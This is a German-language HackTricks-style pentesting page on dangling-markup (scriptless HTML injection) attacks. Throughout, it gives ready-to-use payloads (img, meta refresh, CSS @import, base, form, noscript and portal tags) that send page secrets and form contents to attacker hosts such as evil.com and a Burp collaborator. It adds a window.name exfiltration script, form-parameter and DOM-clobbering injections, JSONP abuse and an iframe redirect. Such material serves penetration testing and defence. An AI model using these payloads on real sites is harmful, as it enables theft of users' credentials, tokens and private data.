# Dangling Markup - HTML scriptless injection

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Zusammenfassung

Diese Technik kann verwendet werden, um Informationen von einem Benutzer zu extrahieren, wenn eine **HTML-Injektion gefunden wird**. Dies ist sehr n√ºtzlich, wenn Sie **keinen Weg finden, eine** [**XSS** ](../xss-cross-site-scripting/) **auszunutzen**, aber Sie k√∂nnen **einige HTML-Tags injizieren**.\
Es ist auch n√ºtzlich, wenn ein **Geheimnis im Klartext gespeichert** ist und Sie es vom Client **exfiltrieren** m√∂chten, oder wenn Sie die Ausf√ºhrung eines Skripts irref√ºhren m√∂chten.

Einige hier kommentierte Techniken k√∂nnen verwendet werden, um einige [**Content Security Policy**](../content-security-policy-csp-bypass/) zu umgehen, indem Informationen auf unerwartete Weise exfiltriert werden (HTML-Tags, CSS, http-Metatags, Formulare, base...).

## Hauptanwendungen

### Klartextgeheimnisse stehlen

Wenn Sie `<img src='http://evil.com/log.cgi?` injizieren, wird der Benutzer Ihnen beim Laden der Seite den gesamten Code zwischen dem injizierten `img`-Tag und dem n√§chsten Anf√ºhrungszeichen im Code senden. Wenn sich ein Geheimnis irgendwie in diesem Abschnitt befindet, werden Sie es stehlen (Sie k√∂nnen dasselbe tun, indem Sie ein doppeltes Anf√ºhrungszeichen verwenden, schauen Sie sich an, was interessanter zu verwenden sein k√∂nnte).

Wenn das `img`-Tag verboten ist (zum Beispiel aufgrund von CSP), k√∂nnen Sie auch `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?` verwenden.
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Beachten Sie, dass **Chrome HTTP-URLs** mit "<" oder "\n" blockiert, daher k√∂nnten Sie andere Protokollschemata wie "ftp" ausprobieren.

Sie k√∂nnen auch CSS `@import` missbrauchen (es wird den gesamten Code senden, bis es ein ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Du k√∂nntest auch **`<table`** verwenden:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Du k√∂nntest auch ein `<base` Tag einf√ºgen. Alle Informationen werden gesendet, bis das Anf√ºhrungszeichen geschlossen ist, aber es erfordert eine Benutzerinteraktion (der Benutzer muss auf einen Link klicken, da das base-Tag die Domain √§ndert, auf die der Link zeigt):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Formulare stehlen
```html
<base href='http://evil.com/'>
```
Dann senden die Formulare, die Daten an den Pfad senden (wie `<form action='update_profile.php'>`), die Daten an die b√∂sartige Domain.

### Formulare stehlen 2

Setzen Sie einen Formularkopf: `<form action='http://evil.com/log_steal'>` Dadurch wird der n√§chste Formularkopf √ºberschrieben und alle Daten aus dem Formular werden an den Angreifer gesendet.

### Formulare stehlen 3

Die Schaltfl√§che kann die URL √§ndern, an die die Informationen des Formulars gesendet werden sollen, mit dem Attribut "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Ein Angreifer kann dies verwenden, um die Informationen zu stehlen.

Finde ein [**Beispiel dieses Angriffs in diesem Bericht**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp).

### Klartextgeheimnisse stehlen 2

Mit der neuesten genannten Technik zum Stehlen von Formularen (Einf√ºgen eines neuen Formular-Headers) k√∂nnen Sie dann ein neues Eingabefeld einf√ºgen:
```html
<input type='hidden' name='review_body' value="
```
und dieses Eingabefeld wird alle Inhalte zwischen seinem doppelten Anf√ºhrungszeichen und dem n√§chsten doppelten Anf√ºhrungszeichen im HTML enthalten. Dieser Angriff mischt "_**Klartextgeheimnisse stehlen**_" mit "_**Formulare stehlen2**_".

Sie k√∂nnen dasselbe tun, indem Sie ein Formular und ein `<option>`-Tag einf√ºgen. Alle Daten bis zu einem geschlossenen `</option>` werden gesendet:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Form-Parameter-Injektion

Sie k√∂nnen den Pfad eines Formulars √§ndern und neue Werte einf√ºgen, sodass eine unerwartete Aktion ausgef√ºhrt wird:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Diebstahl von Klartextgeheimnissen √ºber noscript

`<noscript></noscript>` ist ein Tag, dessen Inhalt interpretiert wird, wenn der Browser kein JavaScript unterst√ºtzt (Sie k√∂nnen JavaScript in Chrome unter [chrome://settings/content/javascript](chrome://settings/content/javascript) aktivieren/deaktivieren).

Ein Weg, um den Inhalt der Webseite vom Injektionspunkt bis zum Ende an eine vom Angreifer kontrollierte Website zu exfiltrieren, besteht darin, dies einzuf√ºgen:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Umgehung von CSP mit Benutzerinteraktion

Aus dieser [Portswiggers-Forschung](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) k√∂nnen Sie lernen, dass selbst in den **am st√§rksten durch CSP eingeschr√§nkten** Umgebungen Sie immer noch mit etwas **Benutzerinteraktion Daten exfiltrieren** k√∂nnen. In diesem Fall werden wir das Payload verwenden:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Beachten Sie, dass Sie das Opfer bitten werden, auf einen Link zu klicken, der ihn zu einem von Ihnen kontrollierten Payload weiterleitet. Beachten Sie auch, dass das `target`-Attribut innerhalb des `base`-Tags HTML-Inhalte bis zum n√§chsten einfachen Anf√ºhrungszeichen enth√§lt.\
Dadurch wird der Wert von `window.name`, wenn der Link angeklickt wird, all diese HTML-Inhalte sein. Daher k√∂nnen Sie, da Sie die Seite kontrollieren, auf die das Opfer durch Klicken des Links zugreift, auf `window.name` zugreifen und diese Daten exfiltrieren:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Irref√ºhrender Skript-Workflow 1 - HTML-Namespace-Angriff

F√ºgen Sie ein neues Tag mit einer ID innerhalb des HTML ein, das das n√§chste √ºberschreiben wird und mit einem Wert, der den Ablauf eines Skripts beeinflussen wird. In diesem Beispiel w√§hlen Sie aus, mit wem Informationen geteilt werden sollen:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Irref√ºhrender Skript-Workflow 2 - Skript-Namensraumangriff

Erstellen Sie Variablen innerhalb des JavaScript-Namensraums, indem Sie HTML-Tags einf√ºgen. Diese Variable wird dann den Ablauf der Anwendung beeinflussen:
```html
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Missbrauch von JSONP

Wenn Sie eine JSONP-Schnittstelle finden, k√∂nnten Sie in der Lage sein, eine beliebige Funktion mit beliebigen Daten aufzurufen:
```html
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Oder Sie k√∂nnen sogar versuchen, JavaScript auszuf√ºhren:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframe-Missbrauch

Ein untergeordnetes Dokument besitzt die F√§higkeit, die `location`-Eigenschaft seines Elternelements anzuzeigen und zu √§ndern, auch in Cross-Origin-Situationen. Dies erm√∂glicht das Einbetten eines Skripts innerhalb eines **iframe**, das den Client auf eine beliebige Seite umleiten kann:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Dies kann mit etwas wie folgt abgemildert werden: `sandbox=' allow-scripts allow-top-navigation'`

Ein iframe kann auch missbraucht werden, um sensible Informationen von einer anderen Seite preiszugeben, **indem das iframe-Name-Attribut verwendet wird**. Dies liegt daran, dass Sie ein iframe erstellen k√∂nnen, das sich selbst iframt und dabei die HTML-Injektion missbraucht, die dazu f√ºhrt, dass die **sensiblen Informationen im iframe-Name-Attribut erscheinen** und dann diesen Namen vom urspr√ºnglichen iframe aus abrufen und preisgeben k√∂nnen.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
F√ºr weitere Informationen siehe [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta-Missbrauch

Sie k√∂nnten **`meta http-equiv`** verwenden, um **mehrere Aktionen** wie das Setzen eines Cookies auszuf√ºhren: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` oder eine Weiterleitung durchzuf√ºhren (in diesem Fall in 5 Sekunden): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Dies kann mit einem **CSP** in Bezug auf **http-equiv** vermieden werden (`Content-Security-Policy: default-src 'self';`, oder `Content-Security-Policy: http-equiv 'self';`)

### Neues \<portal-HTML-Tag

Sie k√∂nnen eine sehr **interessante Forschung** zu ausnutzbaren Schwachstellen des \<portal-Tags [hier](https://research.securitum.com/security-analysis-of-portal-element/) finden.\
Zum Zeitpunkt des Verfassens dieses Textes m√ºssen Sie das Portal-Tag in Chrome unter `chrome://flags/#enable-portals` aktivieren, damit es funktioniert.
```html
<portal src='https://attacker-server?
```
### HTML-Lecks

Nicht alle M√∂glichkeiten, um Konnektivit√§t in HTML zu leaken, sind f√ºr Dangling Markup n√ºtzlich, aber manchmal k√∂nnte es helfen. √úberpr√ºfen Sie sie hier: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Lecks

Dies ist eine **Mischung** zwischen **Dangling Markup und XS-Lecks**. Einerseits erm√∂glicht die Schwachstelle das **Einschleusen von HTML** (aber nicht von JS) auf einer Seite mit der **gleichen Herkunft** wie die, die wir angreifen werden. Andererseits greifen wir nicht direkt die Seite an, auf der wir HTML einschleusen k√∂nnen, sondern **eine andere Seite**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Suche/XS-Lecks

XS-Suche zielt darauf ab, **Informationen √ºber Kreuzherkunft auszuleiten**, indem **Seitenkanalangriffe** missbraucht werden. Daher handelt es sich um eine andere Technik als Dangling Markup, jedoch missbrauchen einige der Techniken die Einbindung von HTML-Tags (mit und ohne JS-Ausf√ºhrung), wie [**CSS-Injection**](../xs-search.md#css-injection) oder [**Lazy Load Images**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Brute-Force-Erkennungsliste

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Referenzen

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
